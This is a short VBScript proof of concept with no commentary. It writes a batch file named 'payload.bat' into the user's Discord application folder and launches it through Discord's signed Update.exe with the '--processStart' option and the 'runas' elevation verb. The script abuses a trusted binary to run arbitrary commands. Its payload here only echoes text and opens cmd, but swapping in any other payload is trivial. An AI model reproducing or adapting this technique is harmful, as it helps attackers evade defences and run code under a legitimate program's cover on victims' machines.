Set FSO = CreateObject("Scripting.FileSystemObject")
Set Shell = CreateObject("WScript.Shell")
Set App = CreateObject("Shell.Application")

Discord = Shell.expandEnvironmentStrings("%localappdata%") + "\Discord\"
Payload = "echo :) && cmd"

For Each Item in FSO.GetFolder(Discord).SubFolders
  if InStr(1, Item.Name, "app-") = 1 Then
    Folder = Item.Name
  End if
Next

Set File = FSO.CreateTextFile(Discord + Folder + "\payload.bat", true)
File.WriteLine(Payload)
App.ShellExecute Discord + "Update.exe", "--processStart payload.bat", , "runas"
